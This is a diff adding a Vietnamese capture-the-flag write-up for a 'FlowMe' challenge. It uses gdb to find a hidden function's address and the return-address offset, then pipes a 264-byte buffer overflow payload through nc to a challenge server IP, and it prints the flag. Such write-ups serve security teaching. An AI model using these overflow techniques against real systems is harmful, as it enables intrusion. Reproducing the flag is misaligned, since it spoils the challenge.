@@ -55,7 +55,18 @@
 
 ### FlowMe
 
-pass
+- Trước tiên dùng `chmod 777 flowme` để có quyền chạy thử.
+- Đọc code suy ra cần phải hướng địa chỉ trả về đến phương thức secrect_func.
+- Dùng `gdb`, đặt breakpoint rồi `disassemble secret_func` để tìm ra địa chỉ ta sẽ hướng đến là `0x00000000004007ea`.
+![Flowme1](./resource/Flowme1.png)
+- Tìm giá trị trả về để tìm vị trí của nó trong stack, ta tìm được giá trị đó là `0x00000000004008a5`.
+![Flowme2](./resource/Flowme2.png)
+- Xem thử vị trí của nó và khoảng cách với con trỏ của biến password_buffer, ta thấy nó ở vị trí `0x7fffffffdb68`.
+![Flowme3](./resource/Flowme3.png)
+- Từ đó lấy được key từ câu lệnh ``echo "`python -c 'print("A"*264+"\xea\x07\x40")'`" | nc 159.65.13.76 33103``.
+![Flowme4](./resource/Flowme4.png)
+
+*Flag:* **HCMUS-CTF{You_have_to_learn_basic_stack_based_buffer_overflow}**
 
 ---
 
